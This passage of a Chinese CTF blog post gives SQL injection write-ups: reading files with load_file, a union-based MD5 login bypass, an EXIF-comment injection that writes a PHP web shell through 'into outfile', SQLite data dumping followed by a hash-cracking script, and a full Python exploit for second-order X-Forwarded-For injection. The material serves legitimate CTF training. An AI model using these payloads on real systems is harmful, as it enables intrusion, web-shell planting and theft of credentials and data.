<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200509171610258.png" alt loading="lazy"></p>
<p>可以到进行了如上操作，切换到<code>/tmp</code>目录下，解压<code>html.zip</code>的压缩包，删除压缩包，复制<code>html</code>目录及其子目录到<code>/var/www/html</code>目录下，然后删除了<code>.DS_Store</code>文件，开启<code>Apache</code>服务</p>
<ul>
<li><code>.DS_Store</code>：Mac OS 保存文件夹的自定义属性的隐藏文件</li>
</ul>
<p>这个过程看上去没毛病，但是中间漏了一点，<code>/tmp</code>目录下了<code>html</code>文件夹中的<code>.DS_Store</code>文件并没用被删除，于是我们尝试读取这个文件，直接读取在页面上回显并不完全</p>
<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200509172422699.png" alt loading="lazy"></p>
<p>于是通过<code>hex</code>方式进行读取</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">a&#39;,content &#x3D; hex(load_file(&#39;&#x2F;tmp&#x2F;html&#x2F;.DS_Store&#39;)),&#x2F;*</code></pre>

<p>得到一长串十六进制数字，放到网站上转文本</p>
<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200509172701095.png" alt loading="lazy"></p>
<p>可以看到应该存放<code>flag</code>的文件，进行读取</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">a&#39;,content &#x3D; load_file(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag_8946e1ff1ee3e40f.php&#39;),&#x2F;*</code></pre>

<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200509172916732.png" alt loading="lazy"></p>
<p>成功拿到flag</p>
<h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><h3 id="安恒杯-新春祈福赛—BabySqli"><a href="#安恒杯-新春祈福赛—BabySqli" class="headerlink" title="安恒杯-新春祈福赛—BabySqli"></a>安恒杯-新春祈福赛—BabySqli</h3><p><strong>解题核心</strong>—————–MD5绕过</p>
<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/FUeKLit8HApfNOP.png" alt loading="lazy"></p>
<p>题目给出的提示：</p>
<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/53qyMpFJAaSEcBz-1586920617685.png" alt loading="lazy"></p>
<p>随便登录后在前端HTML中都能看到这样一串字母</p>
<pre class="language-html" data-language="html"><code class="language-html"><span class="token comment">&lt;!--MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5--></span></code></pre>

<p>base32解码后得到</p>
<pre class="language-none"><code class="language-none">c2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw&#x3D;&#x3D;</code></pre>

<p>base64解码后得到</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">select * from user where username &#x3D; &#39;$name&#39;</code></pre>

<p>sqlmap测试后可以得到admin的密码MD5值，找不到原码</p>
<p>于是参考MD5绕过，参考：<a target="_blank" rel="noopener" href="https://www.gem-love.com/websecurity/453.html">简析GXY_CTF “BabySqli v1.0″绕过md5比较</a></p>
<p>利用以下注入语句</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">name: admin&#39; And 1&gt;2 union select &#39;1&#39;,&#39;admin&#39;,&#39;c4ca4238a0b923820dcc509a6f75849b
pw: 1</code></pre>

<p>注：</p>
<ul>
<li>根据得到的sql后台查询语句，需要用单引号闭合，故最后不用加单引号</li>
<li>union select后的查询当字符串使用需要加单引号，当然数字可以不加单引号</li>
<li>过滤了and可以用大写And绕过</li>
<li>1 的MD5值为c4ca4238a0b923820dcc509a6f75849b</li>
</ul>
<p>于是当前面的语句And 1&gt;2永不成立，联合查询后面的语句就会在数据库中查询显示出来</p>
<img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/XHqfk2AmYUGvNyr-1586920623970.png" style="zoom:67%;" loading="lazy">

<p>于是这时输入password=1即可绕过查询得到flag</p>
<h3 id="36D—WEB-你没见过的注入"><a href="#36D—WEB-你没见过的注入" class="headerlink" title="36D—WEB_你没见过的注入"></a>36D—WEB_你没见过的注入</h3><p>在<code>robots.txt</code>拿到可以直接重置管理员密码的界面<code>pwdreset.php</code>，然后再从前台登录进去，发现是一个文件上传的页面<code>main.php</code>， 界面没有做什么上传限制，但是在上传上去之后会跳转到显示文件列表的界面<code>filelist.php</code>，后台将文件名和后缀都改了，文件名应该是md5加盐后得到的一串字符串，后缀为zip文件，并且可以将文件直接下载下来，下载下来后压缩包打不开，用文本编辑器打开后里面的内容就是我们上传上去文件的内容，后台将其的名字和后缀都改了，测试绕过，无果</p>
<p>参考：<a target="_blank" rel="noopener" href="https://www.gem-love.com/ctf/2283.html#你没见过的注入">你没见过的注入</a></p>
<p>再看到文件列表显示的界面：</p>
<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200506213728072.png" alt loading="lazy"></p>
<p>除了文件名之外后面还有一串类似文件格式一样的东西，详见上面大佬的博客吧，这里给出解题步骤：</p>
<p>这里考的是<code>EXIF</code>信息中<code>comment</code>字段注入，这个字段会存入数据库，<code>finfo-&gt;file()</code>再在后面输出这个信息，造成了sql注入漏洞，先去网上下载一个<code>exiftool</code>工具 ——&gt;  <a target="_blank" rel="noopener" href="https://exiftool.org/">https://exiftool.org/</a></p>
<p>可以编辑图片的的<code>EXIF</code>信息</p>
<p>payload：</p>
<pre class="language-shell" data-language="shell"><code class="language-shell">.&#x2F;exiftool -overwrite_original -comment&#x3D;&quot;y1ng\&quot;&#39;);select 0x3C3F3D60245F504F53545B305D603B into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php&#39;;#&quot; 1.jpg</code></pre>

<p><code>hex(&lt;?=$_POST[0];)</code>=<code>0x3C3F3D60245F504F53545B305D603B</code></p>
<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200506215714097.png" alt loading="lazy"></p>
<p>然后直接上传到网站上去就可以拿shell了（这里png图片无效，不知道为啥）</p>
<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200506215937088.png" alt loading="lazy"></p>
<h3 id="Hack-lu-2017-FlatScience"><a href="#Hack-lu-2017-FlatScience" class="headerlink" title="Hack.lu-2017-FlatScience"></a>Hack.lu-2017-FlatScience</h3><p>界面：</p>
<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200517170522200.png" alt loading="lazy"></p>
<p>这个网站有很多的<code>pdf</code>文件可以下载，暂时没有什么线索</p>
<p>访问<code>robots.txt</code>得到<code>login.php</code>和<code>admin.php</code>两个登录界面，<code>admin.php</code>源码存在<code>hint：do not even try to bypass this</code>，<code>login.php</code>源码也存在<code>TODO: Remove ?debug-Parameter!</code>，于是访问<code>/login.php?debug</code>得到<code>login.php</code>的源码：</p>
<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
ob_start();
?&gt;
..................(HTML)
&lt;?php
if(isset($_POST[&#39;usr&#39;]) &amp;&amp; isset($_POST[&#39;pw&#39;]))&#123;
        $user &#x3D; $_POST[&#39;usr&#39;];
        $pass &#x3D; $_POST[&#39;pw&#39;];

        $db &#x3D; new SQLite3(&#39;..&#x2F;fancy.db&#39;);
        
        $res &#x3D; $db-&gt;query(&quot;SELECT id,name from Users where name&#x3D;&#39;&quot;.$user.&quot;&#39; and password&#x3D;&#39;&quot;.sha1($pass.&quot;Salz!&quot;).&quot;&#39;&quot;);
    if($res)&#123;
        $row &#x3D; $res-&gt;fetchArray();
    &#125;
    else&#123;
        echo &quot;&lt;br&gt;Some Error occourred!&quot;;
    &#125;

    if(isset($row[&#39;id&#39;]))&#123;
            setcookie(&#39;name&#39;,&#39; &#39;.$row[&#39;name&#39;], time() + 60, &#39;&#x2F;&#39;);
            header(&quot;Location: &#x2F;&quot;);
            die();
    &#125;

&#125;

if(isset($_GET[&#39;debug&#39;]))
highlight_file(&#39;login.php&#39;);
?&gt;
................(HTML)</code></pre>

<p>可以看到用的是<code>SQLite</code>数据库，并且可直接查询，未经过过滤，但是密码进行了加密，先看看里面有什么东西，网上查<code>sqlite</code>的语法，和其它数据库大同小异，过程如下：</p>
<p>查表：</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">usr&#x3D;1&#39; union select name,name FROM sqlite_master WHERE type&#x3D;&#39;table&#39; limit 0,1--+&amp;pw&#x3D;111 </code></pre>

<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200517170020527.png" alt loading="lazy"></p>
<p>查表名及其对应的结构：</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">usr&#x3D;1&#39; union select name,sql FROM sqlite_master WHERE type&#x3D;&#39;table&#39; limit 0,1--+&amp;pw&#x3D;111</code></pre>

<p>得到：<code>CREATE TABLE Users(id int primary key,name varchar(255),password varchar(255),hint varchar(255))</code>，可以看到有一个<code>hint</code>字段</p>
<p>再将内容查询出来：</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">usr&#x3D;1&#39; union select name,(id&#x2F;name&#x2F;password) FROM Users limit (0&#x2F;1&#x2F;2),1--+&amp;pw&#x3D;111</code></pre>

<pre class="language-none"><code class="language-none">1,admin,3fab54a50e770d830c0416df817567662a9dc85c,my fav word in my fav paper?!
2,fritze,54eae8935c90f467427f05e4ece82cf569f89507,my love is…?
3,hansi,34b0bb7c304949f9ff2fc101eef0f048be10d3bd,the password is password</code></pre>

<p>表中只有以上三行字段内容，根据<code>hint</code>可知，应该是要在<code>fav paper</code>中找到一个词+<code>Salz</code>之后<code>sha1</code>得到的值为<code>34b0bb7c304949f9ff2fc101eef0f048be10d3bd</code>，这个单词应该就是<code>admin</code>的密码，应该就在前面的那些<code>paper</code>的<code>pdf</code>文件里，于是用<code>wget</code>命令将其全都下载下来：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">wget http:&#x2F;&#x2F;124.126.19.106:43631&#x2F; -r -np -nd -A .pdf</code></pre>

<p>再用脚本遍历所有<code>pdf</code>文件中的单词</p>
<pre class="language-python" data-language="python"><code class="language-python">from io import StringIO
from pdfminer.pdfinterp import PDFResourceManager, PDFPageInterpreter
from pdfminer.converter import TextConverter
from pdfminer.layout import LAParams
from pdfminer.pdfpage import PDFPage
import sys
import string
import os
import hashlib


def get_pdf():
    return [&quot;..&#x2F;FlatScience&#x2F;&quot; + i for i in os.listdir(&quot;..&#x2F;FlatScience&#x2F;&quot;) if i.endswith(&quot;pdf&quot;)]


def convert_pdf_2_text(path):
    rsrcmgr &#x3D; PDFResourceManager()
    retstr &#x3D; StringIO()
    device &#x3D; TextConverter(rsrcmgr, retstr, laparams&#x3D;LAParams())
    interpreter &#x3D; PDFPageInterpreter(rsrcmgr, device)
    with open(path, &#39;rb&#39;) as fp:
        for page in PDFPage.get_pages(fp, set()):
            interpreter.process_page(page)
        text &#x3D; retstr.getvalue()
    device.close()
    retstr.close()
    return text


def find_password():
    pdf_path &#x3D; get_pdf()
    # print(pdf_path)
    for i in pdf_path:
        print(&quot;Searching word in &quot; + i)
        pdf_text &#x3D; convert_pdf_2_text(i).split(&quot; &quot;)
        for word in pdf_text:
            sha1_password &#x3D; hashlib.sha1((word + &quot;Salz!&quot;).encode()).hexdigest()
            if sha1_password &#x3D;&#x3D; &#39;3fab54a50e770d830c0416df817567662a9dc85c&#39;:
                print(&quot;Find the password :&quot; + word)
                exit()


if __name__ &#x3D;&#x3D; &quot;__main__&quot;:
    find_password()</code></pre>

<p>最后跑出<code>password</code>为<code>ThinJerboa</code>，在<code>admin.php</code>登录即可得到<code>flag</code></p>
<h3 id="RoarCTF-2019-Online-Proxy"><a href="#RoarCTF-2019-Online-Proxy" class="headerlink" title="[RoarCTF 2019]Online Proxy"></a>[RoarCTF 2019]Online Proxy</h3><p><code>X-Forwarded-For</code>头注入，</p>
<p>在传入url为找到可疑点，F12查看源码可以看到html页面有注释显示着访问的客户端<code>Ip</code>，推测后端将客户端的<code>Ip</code>地址记录到数据库当中。尝试改写XFF头发现ip可控，推测为XFF头注入，于是尝试sql注入，测试后发现，XFF注入请求一次后，再请求两次正常XFF的ip，即可触发XFF的sql注入，推测后端代码，第二次并未直接从数据库中请求数据，由于第二次请求的ip不一样，服务器会直接将上次的ip显示出来，在第三次请求和第二次一样的ip的时，服务器就会从数据库中查找<code>last ip</code>，即可触发sql注入</p>
<p>exp（glzjin yyds）：</p>
<pre class="language-python" data-language="python"><code class="language-python">#!&#x2F;usr&#x2F;bin&#x2F;env python3

import requests

target &#x3D; &quot;http:&#x2F;&#x2F;node3.buuoj.cn:27167&#x2F;&quot;

def execute_sql(sql):
    print(&quot;[*]请求语句：&quot; + sql)
    return_result &#x3D; &quot;&quot;

    payload &#x3D; &quot;0&#39;|length((&quot; + sql + &quot;))|&#39;0&quot;
    session &#x3D; requests.session()
    r &#x3D; session.get(target, headers&#x3D;&#123;&#39;X-Forwarded-For&#39;: payload&#125;)
    r &#x3D; session.get(target, headers&#x3D;&#123;&#39;X-Forwarded-For&#39;: &#39;glzjin&#39;&#125;)
    r &#x3D; session.get(target, headers&#x3D;&#123;&#39;X-Forwarded-For&#39;: &#39;glzjin&#39;&#125;)
    start_pos &#x3D; r.text.find(&quot;Last Ip: &quot;)
    end_pos &#x3D; r.text.find(&quot; --&gt;&quot;, start_pos)
    length &#x3D; int(r.text[start_pos + 9: end_pos])
    print(&quot;[+]长度：&quot; + str(length))

    for i in range(1, length + 1, 5):
        payload &#x3D; &quot;0&#39;|conv(hex(substr((&quot; + sql + &quot;),&quot; + str(i) + &quot;,5)),16,10)|&#39;0&quot;

        r &#x3D; session.get(target, headers&#x3D;&#123;&#39;X-Forwarded-For&#39;: payload&#125;) # 将语句注入
        r &#x3D; session.get(target, headers&#x3D;&#123;&#39;X-Forwarded-For&#39;: &#39;glzjin&#39;&#125;)    # 查询上次IP时触发二次注入
        r &#x3D; session.get(target, headers&#x3D;&#123;&#39;X-Forwarded-For&#39;: &#39;glzjin&#39;&#125;)    # 再次查询得到结果
        start_pos &#x3D; r.text.find(&quot;Last Ip: &quot;)
        end_pos &#x3D; r.text.find(&quot; --&gt;&quot;, start_pos)
        result &#x3D; int(r.text[start_pos + 9: end_pos])
        return_result +&#x3D; bytes.fromhex(hex(result)[2:]).decode(&#39;utf-8&#39;)

        print(&quot;[+]位置 &quot; + str(i) + &quot; 请求五位成功:&quot; + bytes.fromhex(hex(result)[2:]).decode(&#39;utf-8&#39;))

    return return_result


# 获取数据库
print(&quot;[+]获取成功：&quot; + execute_sql(&quot;SELECT group_concat(SCHEMA_NAME) FROM information_schema.SCHEMATA&quot;))

# 获取数据库表
print(&quot;[+]获取成功：&quot; + execute_sql(&quot;SELECT group_concat(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA &#x3D; &#39;F4l9_D4t4B45e&#39;&quot;))

# 获取数据库表
print(&quot;[+]获取成功：&quot; + execute_sql(&quot;SELECT group_concat(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA &#x3D; &#39;F4l9_D4t4B45e&#39; AND TABLE_NAME &#x3D; &#39;F4l9_t4b1e&#39; &quot;))

# 获取表中内容
print(&quot;[+]获取成功：&quot; + execute_sql(&quot;SELECT group_concat(F4l9_C01uMn) FROM F4l9_D4t4B45e.F4l9_t4b1e&quot;))</code></pre>

</div><div id="reward-container"><span class="hty-icon-button button-glow" id="reward-button" title="打赏" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === &quot;none&quot;) ? &quot;block&quot; : &quot;none&quot;;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-hand-coin-line"></use></svg></span><div id="reward-comment">I'm so cute. Please give me money.</div><div id="qr" style="display:none;"><div style="display:inline-block"><a href="/images/zfb.jpg"><img loading="lazy" src="/images/zfb.jpg" alt="支付宝" title="支付宝"></a><div><span style="color:#00A3EE"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-alipay-line"></use></svg></span></div></div><div style="display:inline-block"><a href="/images/qq.png"><img loading="lazy" src="/images/qq.png" alt="QQ 支付" title="QQ 支付"></a><div><span style="color:#12B7F5"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-qq-line"></use></svg></span></div></div><div style="display:inline-block"><a href="/images/wx.png"><img loading="lazy" src="/images/wx.png" alt="微信支付" title="微信支付"></a><div><span style="color:#2DC100"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-wechat-pay-line"></use></svg></span></div></div></div></div><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>Extrader</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="https://www.extrader.top/posts/e73517db/" title="CTF-SQL注入">https://www.extrader.top/posts/e73517db/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><svg class="icon"><use xlink:href="#icon-creative-commons-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-by-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-nc-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-sa-line"></use></svg></a> 许可协议。</li></ul></section></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/posts/ebf6eea3/" rel="prev" title="初识Flask"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-left-s-line"></use></svg><span class="post-nav-text">初识Flask</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/posts/73702816/" rel="next" title="文件包含漏洞小结"><span class="post-nav-text">文件包含漏洞小结</span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-right-s-line"></use></svg></a></div></div></div><div class="hty-card" id="comment"><div class="comment-tooltip text-center"><span>若您想及时得到回复提醒，建议跳转 GitHub Issues 评论。</span><br><span>若没有本文 Issue，您可以使用 Comment 模版新建。</span><br><a class="hty-button hty-button--raised" id="github-issues" target="_blank" rel="noopener" href="https://github.com/Extrader-home/Extrader-home.github.io/issues?q=is:issue+CTF-SQL注入">GitHub Issues</a></div><div id="valine-container"></div><script>Yun.utils.getScript("https://cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js", () => {
  const valineConfig = {"enable":true,"appId":"D0RsYpx00piDirHr8rmxtml4-gzGzoHsz","appKey":"aCk3nRmmI5uzkoEoVjtToEe8","placeholder":"不留点什么？","avatar":null,"pageSize":10,"visitor":false,"highlight":true,"recordIP":false,"enableQQ":true,"meta":["nick","mail","link"],"el":"#valine-container","lang":"zh-cn"}
  valineConfig.path = "/posts/e73517db/"
  new Valine(valineConfig)
}, window.Valine);</script></div></main><footer class="sidebar-translate" id="footer"><div class="beian"><a rel="noopener" href="https://beian.miit.gov.cn/" target="_blank">湘ICP备2021001321号</a></div><div class="copyright"><span>&copy; 2020 – 2021 </span><span class="with-love" id="animate"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-cloud-line"></use></svg></span><span class="author"> Extrader</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v5.2.0</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.5.3</span></div><div class="live_time"><span>本博客已运行</span><span id="display_live_time"></span><span class="moe-text">(●'◡'●)</span><script>function blog_live_time() {
  setTimeout(blog_live_time, 1000);
  const start = new Date('2020-01-08T00:00:00');
  const now = new Date();
  const timeDiff = (now.getTime() - start.getTime());
  const msPerMinute = 60 * 1000;
  const msPerHour = 60 * msPerMinute;
  const msPerDay = 24 * msPerHour;
  const passDay = Math.floor(timeDiff / msPerDay);
  const passHour = Math.floor((timeDiff % msPerDay) / 60 / 60 / 1000);
  const passMinute = Math.floor((timeDiff % msPerHour) / 60 / 1000);
  const passSecond = Math.floor((timeDiff % msPerMinute) / 1000);
  display_live_time.innerHTML = " " + passDay + " 天 " + passHour + " 小时 " + passMinute + " 分 " + passSecond + " 秒";
}
blog_live_time();
</script></div></footer><a class="hty-icon-button" id="goUp" aria-label="back-to-top" href="#"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-up-s-line"></use></svg><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="搜索"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-search-line"></use></svg></span></a><script>window.addEventListener("DOMContentLoaded", () => {
  // Handle and trigger popup window
  document.querySelector(".popup-trigger").addEventListener("click", () => {
    document.querySelector(".popup").classList.add("show");
    setTimeout(() => {
      document.querySelector(".search-input").focus();
    }, 100);
  });

  // Monitor main search box
  const onPopupClose = () => {
    document.querySelector(".popup").classList.remove("show");
  };

  document.querySelector(".popup-btn-close").addEventListener("click", () => {
    onPopupClose();
  });

  window.addEventListener("keyup", event => {
    if (event.key === "Escape") {
      onPopupClose();
    }
  });
});
</script><script src="/js/search/local-search.js" defer></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-close-line"></use></svg></span></div><div class="search-input-container"><input class="search-input" id="local-search-input" type="text" placeholder="搜索..." value=""></div><div id="local-search-result"></div></div></div><script src="https://cdn.jsdelivr.net/npm/live2d-widget@^3.1.3/lib/L2Dwidget.min.js"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"https://cdn.jsdelivr.net/npm/live2d-widget-model-wanko@1.0.5/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body></html>